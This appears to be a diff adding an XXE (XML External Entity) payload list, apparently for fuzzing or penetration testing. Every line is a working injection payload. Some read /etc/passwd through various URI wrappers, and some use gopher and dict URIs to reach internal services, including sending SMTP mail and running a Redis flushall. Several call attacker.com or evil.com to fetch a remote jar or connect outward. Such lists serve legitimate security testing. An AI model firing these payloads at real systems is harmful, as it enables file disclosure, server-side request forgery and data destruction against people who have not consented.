@@ -1,0 +1,49 @@
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:25/xHELO%20localhost%0AMAIL%20FROM:attacker@evil.com%0ARCPT%20TO:victim@target.com%0ADATA%0AFrom:attacker@evil.com%0ATo:victim@target.com%0ASubject:XXE%0A%0AXXE%20Attack%0A.%0AQUIT">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "dict://127.0.0.1:11211/stats">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "dict://127.0.0.1:6379/info">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://anonymous:anonymous@127.0.0.1:21">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://attacker.com:21/file.txt">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ldap://127.0.0.1:389/dc=example,dc=com">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ldaps://127.0.0.1:636">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:file:///var/www/html/app.jar!/resource.txt">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:/etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "mailto:attacker@evil.com">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "news:comp.lang.java">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ssh://user@127.0.0.1:22">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "telnet://127.0.0.1:23">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "tftp://127.0.0.1:69/file.txt">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0AHost:%20127.0.0.1%0A%0A">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:3306/_">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "dict://127.0.0.1:9200/_status">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "dict://attacker.com:1337/xxe">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://user:password@127.0.0.1:21/file.txt">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftps://127.0.0.1:990">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "sftp://127.0.0.1:22/etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ldap://attacker.com:389/o=root">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:file:///C:/app.jar!/META-INF/MANIFEST.MF">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://127.0.0.1:8080/app.war!/WEB-INF/web.xml">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "zip:file:///var/www/html/archive.zip!/index.php">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "compress:file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "zlib:file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "data:text/plain;base64,SGVsbG8gV29ybGQ=">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "data:text/html,<script>alert('XXE')</script>">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "phar://path/to/archive.phar/file.txt">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "rar://path/to/archive.rar/file.txt">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ogg://path/to/file.ogg">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "glob:///etc/*">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "glob:///*">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "nntp://news.server.com:119/alt.test">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "imap://user:password@127.0.0.1:143/INBOX">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "pop3://user:password@127.0.0.1:110">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "smtp://127.0.0.1:25">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:9000/1">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://attacker.com:70/1">]><foo>&xxe;</foo>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:file:///etc/passwd!/foo">]><foo>&xxe;</foo>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:file:///etc/passwd">]><foo>&xxe;</foo>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:11211/1stats">]><foo>&xxe;</foo>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "dict://127.0.0.1:6379/CONFIG:GET:*">]><foo>&xxe;</foo>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://127.0.0.1:21/%0Aquit">]><foo>&xxe;</foo>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "ldap://127.0.0.1:389/%0astats%0aquit">]><foo>&xxe;</foo>
